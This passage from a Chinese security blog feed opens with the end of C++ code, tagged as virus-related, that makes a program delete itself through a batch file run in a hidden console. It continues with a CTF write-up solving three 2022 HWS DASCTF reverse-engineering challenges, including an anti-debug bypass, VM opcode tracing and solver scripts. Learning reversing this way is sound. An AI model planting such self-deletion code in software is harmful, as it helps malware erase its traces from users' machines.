创建自删除的批处理文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == iType)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// choice 方式</span></span><br><span class="line">bRet = CreateChoiceBat(szBatFileName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">1</span> == iType)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ping 方式</span></span><br><span class="line">bRet = CreatePingBat(szBatFileName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建新的进程, 以隐藏控制台的方式执行批处理</span></span><br><span class="line"><span class="keyword">if</span> (bRet)</span><br><span class="line">&#123;</span><br><span class="line">STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line"><span class="comment">//指定wShowWindow成员有效</span></span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line"><span class="comment">//此成员设为TRUE的话则显示新建进程的主窗口</span></span><br><span class="line">si.wShowWindow = FALSE;</span><br><span class="line">BOOL bRet = CreateProcess(</span><br><span class="line"><span class="comment">//不在此指定可执行文件的文件名</span></span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="comment">//命令行参数</span></span><br><span class="line">szCmd,</span><br><span class="line"><span class="comment">//默认进程安全性</span></span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="comment">//默认进程安全性</span></span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="comment">//指定当前进程内句柄不可以被子进程继承</span></span><br><span class="line">FALSE,</span><br><span class="line"><span class="comment">//为新进程创建一个新的控制台窗口</span></span><br><span class="line">CREATE_NEW_CONSOLE,</span><br><span class="line"><span class="comment">//使用本进程的环境变量</span></span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="comment">//使用本进程的驱动器和目录</span></span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">&amp;si,</span><br><span class="line">&amp;pi);</span><br><span class="line"><span class="keyword">if</span> (bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//不使用的句柄最好关掉</span></span><br><span class="line">CloseHandle(pi.hThread);</span><br><span class="line">CloseHandle(pi.hProcess);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结束进程</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">::ExitProcess(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 程序自删除</span></span><br><span class="line">BOOL bRet = DelSelf( <span class="number">0</span> );</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Selft Delete Error!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Selft Delete OK!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 病毒 </tag>
            
            <tag> 编程开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HWS DASCTF RE</title>
      <link href="2022/01/25/HWS%20DASCTF%20RE/"/>
      <url>2022/01/25/HWS%20DASCTF%20RE/</url>
      
        <content type="html"><![CDATA[<h1 id="2022HWS硬件安全冬令营-X-DASCTF-Jan"><a href="#2022HWS硬件安全冬令营-X-DASCTF-Jan" class="headerlink" title="2022HWS硬件安全冬令营 X DASCTF Jan"></a>2022HWS硬件安全冬令营 X DASCTF Jan</h1><p><img src="https://s2.loli.net/2022/01/25/jeRrUFBK1GnXL4o.png"><br>做完了re，简单总结下本次的比赛，以为是个小比赛，也没奖，冬令营很多人估计也不会去，没想到这么多人来打，且人均全栈。。。</p><p>基本上考的最多的就是去花指令和vm动调了，算法部分都不是太难，毕竟有两道是vm题型，还有道是加了控制流平坦化。之前也总结过vm的专题文章，主要是调试和明白变量所带的含义。</p><p>快过春节了，新年快乐。</p><h2 id="BabyVM"><a href="#BabyVM" class="headerlink" title="BabyVM"></a>BabyVM</h2><p>先去花，只有jnz，jz，E8一种花，patch掉E8就行，但是比较多，可以考虑写个idapython脚本。</p><p>之后可以在这个位置找到vm的初始化。<br><img src="https://s2.loli.net/2022/01/24/GgqD3yPYVwxQbAK.png"><br>可以看到对于vm的初始化可以看出，这个vm还是比较复杂，甚至有EIP和跳转之类的东西，而不是简单的一条流水线。</p><p>然后到了主函数。<br><img src="https://s2.loli.net/2022/01/24/gV36HYRDI5Wr9FX.png"><br>可以看到opcode是3个8字节的数为一组，一共24，相当于第一个数是case语句的选择，第二个数通过调试可以知道，代表的是30字节table的index/2，第三个数就是操作的数据。</p><p>我们打印出所有的opcode。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> opcode1[];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> opcode2[];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> opcode3[];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> opcode4[];</span><br><span class="line"><span class="keyword">int</span> i,k=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1583</span>;i+=<span class="number">24</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x : &quot;</span>,k++);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x, &quot;</span>,*(__int64*)(&amp;opcode1[i]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llx, &quot;</span>,*(__int64*)(&amp;opcode1[i+<span class="number">8</span>]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llx, &quot;</span>,*(__int64*)(&amp;opcode1[i+<span class="number">16</span>]));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n\n&quot;</span>);</span><br><span class="line">k=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">191</span>;i+=<span class="number">24</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x : &quot;</span>,k++);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x, &quot;</span>,*(__int64*)(&amp;opcode2[i]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llx, &quot;</span>,*(__int64*)(&amp;opcode2[i+<span class="number">8</span>]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llx, &quot;</span>,*(__int64*)(&amp;opcode2[i+<span class="number">16</span>]));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">k=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">887</span>;i+=<span class="number">24</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x : &quot;</span>,k++);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x, &quot;</span>,*(__int64*)(&amp;opcode4[i]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llx, &quot;</span>,*(__int64*)(&amp;opcode4[i+<span class="number">8</span>]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llx, &quot;</span>,*(__int64*)(&amp;opcode4[i+<span class="number">16</span>]));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n\n&quot;</span>);</span><br><span class="line">k=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1836</span>;i+=<span class="number">24</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x : &quot;</span>,k++);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x, &quot;</span>,*(__int64*)(&amp;opcode3[i]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llx, &quot;</span>,*(__int64*)(&amp;opcode3[i+<span class="number">8</span>]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%llx, &quot;</span>,*(__int64*)(&amp;opcode3[i+<span class="number">16</span>]));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后来看看vm内部如何处理的。<br><img src="https://s2.loli.net/2022/01/24/AqrnupIM6waD9UO.png"></p><p>opcode3，注释已经标里面了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#打印input flag：</span><br><span class="line"><span class="number">0</span> : <span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">1</span> : <span class="number">12</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line"><span class="number">2</span> : <span class="number">12</span>, <span class="number">2</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">3</span> : <span class="number">12</span>, <span class="number">3</span>, <span class="number">3</span>,</span><br><span class="line"><span class="number">4</span> : <span class="number">12</span>, <span class="number">6</span>, <span class="number">6</span>,</span><br><span class="line"><span class="number">5</span> : <span class="number">12</span>, <span class="number">7</span>, <span class="number">7</span>,</span><br><span class="line"><span class="number">6</span> : <span class="number">1</span>, <span class="number">0</span>, <span class="number">69</span>,</span><br><span class="line"><span class="number">7</span> : <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>e,</span><br><span class="line"><span class="number">8</span> : <span class="number">1</span>, <span class="number">2</span>, <span class="number">70</span>,</span><br><span class="line"><span class="number">9</span> : <span class="number">1</span>, <span class="number">3</span>, <span class="number">75</span>,</span><br><span class="line">a : <span class="number">1</span>, <span class="number">6</span>, <span class="number">74</span>,</span><br><span class="line">b : <span class="number">1</span>, <span class="number">7</span>, <span class="number">20</span>,</span><br><span class="line">c : <span class="number">18</span>, <span class="number">0</span>, ffffffffffffffff,</span><br><span class="line">d : <span class="number">18</span>, <span class="number">1</span>, ffffffffffffffff,</span><br><span class="line">e : <span class="number">18</span>, <span class="number">2</span>, ffffffffffffffff,</span><br><span class="line">f : <span class="number">18</span>, <span class="number">3</span>, ffffffffffffffff,</span><br><span class="line"><span class="number">10</span> : <span class="number">18</span>, <span class="number">6</span>, ffffffffffffffff,</span><br><span class="line"><span class="number">11</span> : <span class="number">18</span>, <span class="number">7</span>, ffffffffffffffff,</span><br><span class="line"><span class="number">12</span> : <span class="number">1</span>, <span class="number">0</span>, <span class="number">66</span>,</span><br><span class="line"><span class="number">13</span> : <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>c,</span><br><span class="line"><span class="number">14</span> : <span class="number">1</span>, <span class="number">2</span>, <span class="number">61</span>,</span><br><span class="line"><span class="number">15</span> : <span class="number">1</span>, <span class="number">3</span>, <span class="number">67</span>,</span><br><span class="line"><span class="number">16</span> : <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>a,</span><br><span class="line"><span class="number">17</span> : <span class="number">1</span>, <span class="number">7</span>, <span class="number">20</span>,</span><br><span class="line"><span class="number">18</span> : <span class="number">18</span>, <span class="number">0</span>, ffffffffffffffff,</span><br><span class="line"><span class="number">19</span> : <span class="number">18</span>, <span class="number">1</span>, ffffffffffffffff,</span><br><span class="line"><span class="number">1</span>a : <span class="number">18</span>, <span class="number">2</span>, ffffffffffffffff,</span><br><span class="line"><span class="number">1b</span> : <span class="number">18</span>, <span class="number">3</span>, ffffffffffffffff,</span><br><span class="line"><span class="number">1</span>c : <span class="number">18</span>, <span class="number">6</span>, ffffffffffffffff,</span><br><span class="line"><span class="number">1</span>d : <span class="number">18</span>, <span class="number">7</span>, ffffffffffffffff,</span><br><span class="line"><span class="number">1</span>e : <span class="number">12</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">#循环getchar(),长度为<span class="number">0x26</span></span><br><span class="line"><span class="number">1f</span> : <span class="number">17</span>, <span class="number">0</span>, ffffffffffffffff, <span class="comment">//getchar</span></span><br><span class="line"><span class="number">20</span> : <span class="number">5</span>, <span class="number">0</span>, ffffffffffffffff,  <span class="comment">//push to add1+偏移</span></span><br><span class="line"><span class="number">21</span> : <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>,      <span class="comment">//i++</span></span><br><span class="line"><span class="number">22</span> : <span class="number">1</span>a, <span class="number">1</span>, <span class="number">26</span>,    <span class="comment">//0x26</span></span><br><span class="line"><span class="number">23</span> : <span class="number">1</span>e, <span class="number">1f</span>, ffffffffffffffff,  <span class="comment">//决定是否跳转到1f</span></span><br><span class="line"><span class="number">24</span> : <span class="number">19</span>, ffffffffffffffff, ffffffffffffffff,</span><br></pre></td></tr></table></figure><p>这段opcode设计到一些重要的case语句。</p><pre><code>case 0x17: 读取一个字符。case 5: push flag[i] 到addr+偏移的地址处。case 7: 类似于i++之类的操作，i存放在table的某个位置，忘了。case 0x1A: 比较i是否等于0x26，从而改变伪标志寄存器，也就是那4个byte。case 0x1E: 根据伪标志寄存器决定是否跳转，第一个参数就是代表要跳转的地方。</code></pre><p>调试可知，前面很大一部分都是在读数据，然后打印，然后后面部分就是在循环getchar()。</p><p>sub_C22AB0函数断下来，opcode4，计算部分了。</p><pre><code>0 : 6, 0, ffffffffffffffff,            //pop form add1+偏移 到T[0]，注意相当于是从最下面开始pop的，也就是先pop的 &#39;&#125;&#39;1 : 1a, 0, 7d,2 : 1c, 12, ffffffffffffffff,        //等于7d则跳到12#failed。3 : 1, 0, 77,4 : 1, 1, 72,5 : 1, 2, 6f,6 : 1, 3, 6e,7 : 1, 6, 67,8 : 1, 7, 21,9 : 18, 0, ffffffffffffffff,a : 18, 1, ffffffffffffffff,b : 18, 2, ffffffffffffffff,c : 18, 3, ffffffffffffffff,d : 18, 6, ffffffffffffffff,e : 18, 7, ffffffffffffffff,f : 1, 0, a,10 : 18, 0, ffffffffffffffff,11 : 19, ffffffffffffffff, ffffffffffffffff,#开始循环，不断pop出0x19个数据，也就是flag&#123;&#125;，花括号里面的部分，并且push到add2+偏移。12 : 1, 8, 100,13 : 1a, 8, e1,14 : 1e, 19, ffffffffffffffff,15 : 6, 0, ffffffffffffffff,            //pop form add1+偏移16 : 4, 8, 0,                            //push to add2+偏移17 : 9, 8, 1,18 : 1d, 13, ffffffffffffffff,            //是否跳转到13#比较前5个字符是否是flag&#123;19 : 6, 0, ffffffffffffffff,1a : 1a, 0, 7b,1b : 1f, 3, ffffffffffffffff,            //是否跳转到3，也就是failed1c : 6, 0, ffffffffffffffff,1d : 1a, 0, 67,1e : 1f, 3, ffffffffffffffff,1f : 6, 0, ffffffffffffffff,20 : 1a, 0, 61,21 : 1f, 3, ffffffffffffffff,22 : 6, 0, ffffffffffffffff,23 : 1a, 0, 6c,24 : 1f, 3, ffffffffffffffff,25 : 6, 0, ffffffffffffffff,26 : 1a, 0, 66,27 : 1f, 3, ffffffffffffffff,    #开始循环加密和比较。        28 : 12, 9, 9,                     //异或清零T[2*9]29 : 1, a, e1,2a : 3, 7, 9,                    //pop form add2+偏移，获取enc[i]2b : 3, 6, a,                    //pop form add2+偏移，获取flag[i]2c : 11, 6, 42,                    //flag[i]^422d : d, 6, 2,                    //flag[i]&lt;&lt;2，存放在T[6*2]2e : 1b, 6, 7,                    //比较flag[i]和enc[i]从而改变标志寄存器2f : 1f, 3, ffffffffffffffff,        30 : 7, 9, 1,31 : 7, a, 1,32 : 1a, 9, 20,                    //判断循环是否结束33 : 1e, 2a, ffffffffffffffff,    //是否跳转到2a#success34 : 1, 0, 63,35 : 1, 1, 6f,36 : 1, 2, 72,37 : 1, 3, 72,38 : 1, 6, 65,39 : 1, 7, 63,3a : 18, 0, ffffffffffffffff,3b : 18, 1, ffffffffffffffff,3c : 18, 2, ffffffffffffffff,3d : 18, 3, ffffffffffffffff,3e : 18, 6, ffffffffffffffff,3f : 18, 7, ffffffffffffffff,40 : 1, 0, 74,41 : 1, 1, 6c,42 : 1, 2, 79,43 : 1, 3, 21,44 : 1, 6, a,45 : 18, 0, ffffffffffffffff,46 : 18, 1, ffffffffffffffff,47 : 18, 2, ffffffffffffffff,48 : 18, 3, ffffffffffffffff,49 : 18, 6, ffffffffffffffff,4a : 19, ffffffffffffffff, ffffffffffffffff,4b : 0, 0, 0,4c : 0, 4d0000000000, 402a100000072000,</code></pre><p>一些重要的case语句。<br>    case 6：pop 语句，从add1+偏移地址处，取数据提到T[0]，是反着提的。</p><pre><code>case 0x1C: 和1E差不多，根据伪标志寄存器决定是否跳转，第一个参数就是代表要跳转的地方。case 0x11：^42case 0xd: &lt;&lt;2case 3：pop form add2+偏移case 4：push to add2+偏移</code></pre><p>所以加密就是(flag[i]^0x42)&lt;&lt;2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enc=[<span class="number">0x000000000000009C</span>, <span class="number">0x00000000000001C0</span>, <span class="number">0x00000000000001D8</span>, <span class="number">0x00000000000001D4</span>,</span><br><span class="line">    <span class="number">0x00000000000001D4</span>, <span class="number">0x00000000000001E8</span>, <span class="number">0x00000000000001C8</span>, <span class="number">0x0000000000000098</span>,</span><br><span class="line">    <span class="number">0x00000000000001C8</span>, <span class="number">0x00000000000001C0</span>, <span class="number">0x00000000000001EC</span>, <span class="number">0x000000000000008C</span>,</span><br><span class="line">    <span class="number">0x00000000000001D4</span>, <span class="number">0x000000000000008C</span>, <span class="number">0x00000000000001EC</span>, <span class="number">0x00000000000001EC</span>,</span><br><span class="line">    <span class="number">0x00000000000001C0</span>, <span class="number">0x00000000000001C0</span>, <span class="number">0x00000000000001D8</span>, <span class="number">0x00000000000001D4</span>,</span><br><span class="line">    <span class="number">0x000000000000009C</span>, <span class="number">0x00000000000001D0</span>, <span class="number">0x00000000000001D0</span>, <span class="number">0x00000000000001D0</span>,</span><br><span class="line">    <span class="number">0x00000000000001D4</span>, <span class="number">0x00000000000001E8</span>, <span class="number">0x00000000000001D0</span>, <span class="number">0x00000000000001EC</span>,</span><br><span class="line">    <span class="number">0x00000000000001C8</span>, <span class="number">0x00000000000001C8</span>, <span class="number">0x00000000000001E8</span>, <span class="number">0x000000000000008C</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    print(<span class="built_in">chr</span>((i&gt;&gt;<span class="number">2</span>) ^<span class="number">0x42</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#e247780d029a7a992247e6667869008a</span></span><br></pre></td></tr></table></figure><p>虽然这道题加密部分并不是很难，但是这种vm的格式却让我眼前一亮，不仅有EIP，更是模拟出来了C语言中的for循环，不再是简简单单的流水线式opcode。</p><h2 id="EasyVM"><a href="#EasyVM" class="headerlink" title="EasyVM"></a>EasyVM</h2><p>做题时的笔记没了，g。</p><p>开头一个NtCurrentPeb()-&gt;BeingDebugged，简单绕过下就行。</p><p>然后会引发一个异常。<br><img src="https://s2.loli.net/2022/01/25/GD5KoX3YCazxcbW.png"><br>断下来后我们就可以看到大概的逻辑了。<br><img src="https://s2.loli.net/2022/01/25/eYF2mj9lH35bnPk.png"><br>sub_401000函数，vm结构体，vm指令处理函数。</p><pre><code>struct vm &#123;    _DWORD* functions;    _DWORD* EIP;    _DWORD eax;    _DWORD ebx;    _DWORD ecx;    _DWORD edx;    _DWORD* enc;    _DWORD 忘了;    _DWORD* flag;&#125;</code></pre><p><img src="https://s2.loli.net/2022/01/25/uhm584Qv9RsJZrW.png"><br>c++类实现的，还是动调慢慢分析一轮吧，实际上需要分析两轮，函数对EIP的修改都不一样，opcode很少，加密部分在循环，基本上只用到eax，ebx，ecx三个个寄存器。ecx作为index。</p><p>加密逻辑就是</p><pre><code>flag[0]^0xee^0flag[1]^0xee^flag[0]flag[2]^0xee^flag[1]···</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc=[  <span class="number">0xBE</span>, <span class="number">0x36</span>, <span class="number">0xAC</span>, <span class="number">0x27</span>, <span class="number">0x99</span>, <span class="number">0x4F</span>, <span class="number">0xDE</span>, <span class="number">0x44</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>,</span><br><span class="line">  <span class="number">0xDA</span>, <span class="number">0x0B</span>, <span class="number">0xB5</span>, <span class="number">0x17</span>, <span class="number">0xB8</span>, <span class="number">0x68</span>, <span class="number">0xC2</span>, <span class="number">0x4E</span>, <span class="number">0x9C</span>, <span class="number">0x4A</span>,</span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x43</span>, <span class="number">0xF0</span>, <span class="number">0x22</span>, <span class="number">0x8A</span>, <span class="number">0x3B</span>, <span class="number">0x88</span>, <span class="number">0x5B</span>, <span class="number">0xE5</span>, <span class="number">0x54</span>,</span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x68</span>, <span class="number">0xD5</span>, <span class="number">0x67</span>, <span class="number">0xD4</span>, <span class="number">0x06</span>, <span class="number">0xAD</span>, <span class="number">0x0B</span>, <span class="number">0xD8</span>, <span class="number">0x50</span>,</span><br><span class="line">  <span class="number">0xF9</span>, <span class="number">0x58</span>, <span class="number">0xE0</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x4A</span>, <span class="number">0xFD</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>, <span class="number">0x36</span>,</span><br><span class="line">  <span class="number">0x85</span>, <span class="number">0x52</span>, <span class="number">0xFB</span>, <span class="number">0x73</span>, <span class="number">0xD7</span>, <span class="number">0x0D</span>, <span class="number">0xE3</span>]</span><br><span class="line">print(<span class="built_in">hex</span>(<span class="number">0xBE</span>^<span class="number">0xee</span>),end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(enc)):</span><br><span class="line">    print(<span class="built_in">hex</span>(enc[i-<span class="number">1</span>]^enc[i]^<span class="number">0xee</span>),end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">table=[<span class="number">0x50</span>,<span class="number">0x66</span>,<span class="number">0x74</span>,<span class="number">0x65</span>,<span class="number">0x50</span>,<span class="number">0x38</span>,<span class="number">0x7f</span>,<span class="number">0x74</span>,<span class="number">0x44</span>,<span class="number">0x5f</span>,<span class="number">0x6b</span>,<span class="number">0x3f</span>,<span class="number">0x50</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,<span class="number">0x3e</span>,<span class="number">0x44</span>,<span class="number">0x62</span>,<span class="number">0x3c</span>,<span class="number">0x38</span>,<span class="number">0x45</span>,<span class="number">0x4c</span>,<span class="number">0x5d</span>,<span class="number">0x3c</span>,<span class="number">0x46</span>,<span class="number">0x5f</span>,<span class="number">0x5d</span>,<span class="number">0x3d</span>,<span class="number">0x50</span>,<span class="number">0x5f</span>,<span class="number">0x45</span>,<span class="number">0x79</span>,<span class="number">0x53</span>,<span class="number">0x5c</span>,<span class="number">0x5d</span>,<span class="number">0x3c</span>,<span class="number">0x45</span>,<span class="number">0x48</span>,<span class="number">0x3d</span>,<span class="number">0x66</span>,<span class="number">0x47</span>,<span class="number">0x4f</span>,<span class="number">0x56</span>,<span class="number">0x61</span>,<span class="number">0x44</span>,<span class="number">0x61</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,<span class="number">0x45</span>,<span class="number">0x5c</span>,<span class="number">0x5d</span>,<span class="number">0x39</span>,<span class="number">0x47</span>,<span class="number">0x66</span>,<span class="number">0x4a</span>,<span class="number">0x34</span>,<span class="number">0x0</span>]</span><br><span class="line">key=[<span class="number">0xa</span>,<span class="number">0xb</span>,<span class="number">0xc</span>,<span class="number">0xd</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">    table[i]=table[i]^key[i%<span class="number">4</span>]</span><br><span class="line">print(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">flag=base64.b64decode(<span class="built_in">bytes</span>(table))</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;2586dc76-98d5-44e2-ad58-d06e6559d82a&#125;</span></span><br></pre></td></tr></table></figure><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>先去花，这里有两种花，一种和前面的差不多，还有种如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 